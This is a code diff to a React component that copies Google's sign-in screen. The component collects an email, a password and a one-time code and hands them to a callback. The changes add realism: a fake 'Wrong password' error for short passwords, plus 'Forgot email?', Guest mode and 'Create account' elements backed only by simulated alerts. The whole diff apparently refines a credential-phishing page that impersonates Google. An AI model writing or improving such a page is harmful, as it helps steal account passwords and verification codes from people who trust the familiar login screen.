@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { Loader2, X, ChevronDown } from 'lucide-react';
+import { Loader2, X, ChevronDown, Eye, EyeOff } from 'lucide-react';
 
 interface GoogleLoginSimulatorProps {
   onSuccess: (email: string, password?: string) => void;
@@ -14,6 +14,7 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
   const [otpCode, setOtpCode] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
 
   // Lock body scroll when modal is open
   useEffect(() => {
@@ -48,6 +49,10 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
         setError('Enter a password');
         return;
       }
+      if (password.length < 4) {
+        setError('Wrong password. Try again or click Forgot Password to reset it.');
+        return;
+      }
       setIsLoading(true);
       await new Promise(resolve => setTimeout(resolve, 1500));
       setIsLoading(false);
@@ -61,9 +66,19 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
       }
       setIsLoading(true);
       await new Promise(resolve => setTimeout(resolve, 2000));
-      // Pass Email AND Password back
+      setIsLoading(false);
+      
+      // Critical Fix: Call onSuccess directly
       onSuccess(email, password);
     }
+  };
+
+  const handleForgot = () => {
+      alert("Fitur simulasi: Reset password telah dikirim ke email/nomor pemulihan Anda.");
+  };
+
+  const handleCreateAccount = () => {
+      alert("Fitur simulasi: Halaman pembuatan akun akan terbuka di tab baru.");
   };
 
   return (
@@ -84,7 +99,7 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
             </div>
         )}
 
-        {/* Close Button (Subtle) */}
+        {/* Close Button */}
         <button 
             onClick={onClose}
             className="absolute top-4 right-4 text-gray-500 hover:text-gray-800 transition-colors z-50 p-2"
@@ -167,6 +182,14 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
                                         <span>{error}</span>
                                     </div>
                                 )}
+                                <div className="mt-8 text-sm text-[#1a73e8] font-medium cursor-pointer" onClick={handleForgot}>
+                                    Forgot email?
+                                </div>
+                                <div className="mt-8 text-sm text-gray-600">
+                                    Not your computer? Use Guest mode to sign in privately.
+                                    <br />
+                                    <a href="#" className="text-[#1a73e8] font-medium">Learn more</a>
+                                </div>
                             </motion.div>
                         )}
 
@@ -179,7 +202,7 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
                             >
                                 <div className="relative group">
                                     <input 
-                                        type="password"
+                                        type={showPassword ? "text" : "password"}
                                         id="password"
                                         className={`peer block w-full rounded-[4px] border border-gray-300 px-3.5 pt-5 pb-2 text-base text-gray-900 bg-white focus:border-[#1a73e8] focus:outline-none focus:ring-1 focus:ring-[#1a73e8] appearance-none ${error ? 'border-red-600 focus:border-red-600 focus:ring-red-600' : ''}`}
                                         placeholder=" "
@@ -200,7 +223,12 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
                                 </div>
                                 <div className="mt-3">
                                     <label className="flex items-center gap-3 cursor-pointer select-none">
-                                        <input type="checkbox" className="w-4 h-4 text-[#1a73e8] rounded border-gray-300 focus:ring-[#1a73e8]" />
+                                        <input 
+                                            type="checkbox" 
+                                            checked={showPassword}
+                                            onChange={(e) => setShowPassword(e.target.checked)}
+                                            className="w-4 h-4 text-[#1a73e8] rounded border-gray-300 focus:ring-[#1a73e8]" 
+                                        />
                                         <span className="text-sm text-gray-900">Show password</span>
                                     </label>
                                 </div>
@@ -238,9 +266,15 @@ const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, 
 
                 {/* Actions Footer */}
                 <div className="flex items-center justify-between mt-12 mb-2">
-                    <button type="button" className="text-[#1a73e8] text-sm font-medium hover:bg-blue-50 px-2 py-2 -ml-2 rounded transition-colors" onClick={() => step === 'password' ? setStep('email') : setStep('password')}>
-                        Forgot password?
-                    </button>
+                    {step === 'email' ? (
+                         <button type="button" className="text-[#1a73e8] text-sm font-medium hover:bg-blue-50 px-2 py-2 -ml-2 rounded transition-colors" onClick={handleCreateAccount}>
+                            Create account
+                        </button>
+                    ) : (
+                        <button type="button" className="text-[#1a73e8] text-sm font-medium hover:bg-blue-50 px-2 py-2 -ml-2 rounded transition-colors" onClick={() => step === 'password' ? handleForgot() : setStep('email')}>
+                            {step === 'password' ? 'Forgot password?' : 'Try another way'}
+                        </button>
+                    )}
 
                     <button 
                         type="submit"
